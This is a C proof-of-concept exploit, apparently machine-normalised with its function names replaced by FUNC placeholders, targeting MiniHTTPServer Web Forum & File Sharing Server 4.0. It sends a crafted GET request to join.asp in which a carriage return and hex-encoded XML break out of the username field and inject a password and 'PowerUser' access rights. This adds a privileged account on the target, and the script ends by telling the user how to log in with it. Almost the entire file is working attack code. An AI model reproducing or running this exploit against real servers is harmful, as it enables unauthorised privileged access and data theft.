#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef  int /*<<< orphan*/  sockin ;
typedef  int /*<<< orphan*/  WSADATA ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  FUNC0 (int,int) ; 
 int MAXBUF ; 
 int SOCKET_ERROR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC1 () ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int FUNC4 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,char*) ; 
 struct hostent* FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int /*<<< orphan*/  FUNC11 (int,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC14 (char*,...) ; 
 int /*<<< orphan*/  FUNC15 (char*) ; 
 char* FUNC16 (char*) ; 

int FUNC17(int argc, char *argv[])
{
	/* make sure this lowercase only username here is unique to the server - else exploit fails */

	unsigned char ExploitStart[] =
	"/join.asp?frmUserID=uniquerandomusername&frmUserPass=pwd1234&frmMailBox=me@blah.net";




	unsigned char Exploit[] =
	"\x3c\x2f\x55\x73\x65\x72\x6e\x61\x6d\x65\x3e\x3c"
	"\x50\x61\x73\x73\x77\x6f\x72\x64\x3e\x31\x32\x33\x34"
	"\x3c\x2f\x50\x61\x73\x73\x77\x6f\x72\x64\x3e\x3c"
	"\x41\x63\x63\x65\x73\x73\x72\x69\x67\x68\x74\x3e"
	"\x50\x6f\x77\x65\x72\x55\x73\x65\x72\x3c\x2f\x41"
	"\x63\x63\x65\x73\x73\x72\x69\x67\x68\x74\x3e\x3c"
	"\x45\x6d\x61\x69\x6c\x3e\x61\x40\x68\x65\x72\x65"
	"\x2e\x6e\x65\x74";

	WSADATA wsaData;
	char *hostname;
	struct hostent *hp;
	int sockfd, bytes_read;
	struct sockaddr_in sockin;
    char buffer[MAXBUF];
	char Exp[MAXBUF];

	FUNC10("\n=================================================================================\n");
	FUNC10("0-day MiniHTTPServer Web Forum & File Sharing Server 4.0 Add PowerUser Vulnerability \n");
	FUNC10("Proof Of Concept Code and Discovery by Greg Linares <GLinares.Code [At] GMail [Dot] Com\n");
	FUNC10("Exploits: invalid user-input on join.asp Membership Join Page\n");
	FUNC10("Adds a PowerUser - which has full read/write to Level Medium - Low Shares and Forum Editing\n");
	FUNC10("and still able to read all files on High Level shares.\n");
	FUNC10("Reported: Wednesday October 25th 2006\n");
	FUNC10("=================================================================================\n");

    if ( argc != 3 )
	{
    	FUNC10("usage: %s <IP-addr or hostname> <username to add>\n", argv[0]);
		FUNC5(0);
	}


	hostname = argv[1];
	if (FUNC2(FUNC0(1, 1), &wsaData) < 0)
   	{
    	FUNC6(stderr, "Error setting up with WinSock v1.1\n");
      	FUNC5(-1);
   	}



	hp = FUNC7(hostname);
   	if (hp == NULL)
   	{
      	FUNC10("ERROR: Uknown host %s\n", hostname);
	  	FUNC10("%s",hostname);
      	FUNC5(-1);
   	}

   	sockin.sin_family = AF_INET;
   	sockin.sin_port = FUNC8(80);
   	sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   	if ((sockfd = FUNC12(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   	{
      	FUNC10("ERROR: Socket Error\n");
      	FUNC5(-1);
   	}

   	if ((FUNC4(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   	{
      	FUNC10("ERROR: Connect Error\n");
      	FUNC3(sockfd);
      	FUNC1();
      	FUNC5(-1);
   	}

   	FUNC10("Connected to [%s] on port [80], sending overflow....\n\n\n",
          hostname);



	FUNC9(Exp, 0, 1024);
	FUNC14(Exp, ExploitStart);
	/* you can add more \r to create blank lines in the userlist (harder to read) */
	FUNC14(Exp, "\r");
	FUNC14(Exp, "\x3c\x55\x73\x65\x72\x6e\x61\x6d\x65\x3e");
   	FUNC14(Exp, FUNC16(argv[2]));
	FUNC14(Exp, Exploit);


	FUNC9(buffer, 0, 1024);
    FUNC13(buffer, "GET %s HTTP/1.0\n\n", Exp);
    FUNC11(sockfd, buffer, FUNC15(buffer), 0);

	/*
	You can re-add this if you want to see the HTTP Response
    do
    {

        bytes_read = recv(sockfd, buffer, sizeof(buffer), 0);
        if ( bytes_read > 0 )
            printf("%s", buffer);
    }
    while ( bytes_read > 0 );
	*/

	FUNC10("Exploit Sent to [%s] \n Login with Username: %s (lowercase) \n Password: 1234\n", hostname, FUNC16(argv[2]));
	FUNC10("Any Questions/Comments/Concerns ==> GLinares.Code [at] Gmail [dot] com\n");
	FUNC1();
    return 0;
}